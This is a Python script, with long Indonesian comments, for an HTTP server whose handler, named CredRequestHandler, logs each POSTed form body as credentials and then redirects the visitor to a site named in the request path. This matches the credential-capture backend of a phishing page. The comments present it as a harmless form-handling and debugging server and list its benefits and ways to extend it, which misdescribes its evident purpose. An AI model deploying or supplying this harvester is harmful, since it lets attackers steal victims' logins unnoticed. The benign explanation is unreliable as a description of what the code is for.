import http.server
import socketserver
import urllib.error
import urllib.parse
import urllib.request


class CredRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print(creds)
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.parse.unquote(site))
        self.end_headers()


server = socketserver.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()

# ========================================================================================================================================================================================================================================================================================================================== # 
# Program ini adalah sebuah server sederhana yang menggunakan modul http.server dan socketserver dari Python untuk menangani permintaan HTTP. Tujuannya adalah untuk menerima data dari metode HTTP POST, mencetak data tersebut, kemudian mengarahkan pengguna ke URL yang ditentukan dalam permintaan.

# Berikut adalah penjelasan alur programnya:

# Import Modul: Program mengimpor modul http.server, socketserver, urllib.error, urllib.parse, dan urllib.request. Modul-modul ini digunakan untuk membuat server HTTP dan menangani URL.

# Kelas CredRequestHandler: Ini adalah subclass dari http.server.SimpleHTTPRequestHandler. Kelas ini akan menangani permintaan HTTP, khususnya permintaan POST.

# Metode do_POST: Ini adalah metode yang akan dipanggil saat server menerima permintaan POST dari klien. Di dalamnya:

# Mengambil panjang konten dari header permintaan dan membacanya.
# Membaca data yang dikirim oleh klien (credential) dari self.rfile, dan mendekodekannya dari byte menjadi string menggunakan UTF-8.
# Mencetak kredensial yang diterima.
# Mendapatkan situs yang diminta dari self.path, dan menghilangkan karakter slash pertama untuk mendapatkan URL yang sebenarnya.
# Mengirim respons HTTP dengan status kode 301 (Redirect Permanent).
# Menambahkan header Location dengan URL yang telah di-decode menggunakan urllib.parse.unquote.
# Mengakhiri header.

# Objek server: Membuat objek socketserver.TCPServer yang mengikat alamat IP '0.0.0.0' dan port 8080, dengan handler CredRequestHandler.

# server.serve_forever(): Memulai server dan terus melayani permintaan tanpa batas waktu.

# Jadi, keseluruhan program ini berfungsi sebagai server sederhana yang mendengarkan permintaan HTTP di port 8080 dan mencetak kredensial yang diterima dari permintaan POST, lalu mengarahkan pengguna ke URL yang diminta.

# ========================================================================================================================================================================================================================================= # 

# **Fungsi:**
# Program ini berfungsi sebagai server HTTP sederhana yang dapat digunakan untuk menerima data melalui metode HTTP POST, mencetak data tersebut, dan mengarahkan pengguna ke URL yang ditentukan dalam permintaan. Ini dapat berguna dalam pengembangan web untuk menangani formulir, autentikasi pengguna, atau pengalihan pengguna ke halaman lain.

# **Manfaat:**
# 1. **Penerimaan Data**: Program ini memungkinkan server untuk menerima data dari klien melalui metode HTTP POST, yang dapat berguna untuk menerima formulir atau data lain yang dikirim oleh pengguna melalui aplikasi web.
# 2. **Pencetakan Data**: Data yang diterima dari permintaan POST dicetak, sehingga memudahkan pengembang untuk memantau atau melakukan debugging terhadap data yang diterima oleh server.
# 3. **Pengalihan Pengguna**: Program ini mengarahkan pengguna ke URL yang ditentukan dalam permintaan, memberikan fleksibilitas untuk mengarahkan pengguna ke halaman lain, misalnya setelah pengguna berhasil melakukan login atau mengisi formulir.

# **Cara Penggunaan:**
# 1. **Menjalankan Server**: Jalankan program Python ini pada terminal atau lingkungan pengembangan Python.
# 2. **Mengirim Permintaan POST**: Gunakan aplikasi klien HTTP atau buat permintaan POST dari kode klien yang dapat mengirim data ke server ini. Misalnya, dengan menggunakan formulir HTML dengan metode POST.
# 3. **Mengamati Output**: Amati keluaran dari server, yang akan mencetak data yang diterima dari permintaan POST.
# 4. **Mengarahkan Pengguna**: Jika diarahkan oleh kode klien atau aplikasi web, perhatikan bahwa pengguna akan diarahkan ke URL yang ditentukan dalam permintaan POST.

# **Pengembangan:**
# 1. **Penanganan Data**: Anda dapat memperluas program ini untuk menangani berbagai jenis data yang diterima dari permintaan POST, misalnya dengan memvalidasi dan menyimpan data ke database.
# 2. **Keamanan**: Tambahkan lapisan keamanan seperti otentikasi untuk memastikan bahwa hanya pengguna yang sah yang dapat mengirim data atau mengakses halaman yang diarahkan.
# 3. **Pengujian**: Uji program ini secara menyeluruh untuk memastikan bahwa itu berfungsi sesuai dengan yang diharapkan dalam berbagai kondisi dan beban.
# 4. **Optimalisasi**: Lakukan optimalisasi untuk meningkatkan kinerja server, seperti menangani permintaan secara asynchronous atau caching respons yang sering diminta.

# Dengan mengembangkan program ini lebih lanjut, Anda dapat membuat server HTTP yang kuat dan andal untuk keperluan pengembangan web Anda.
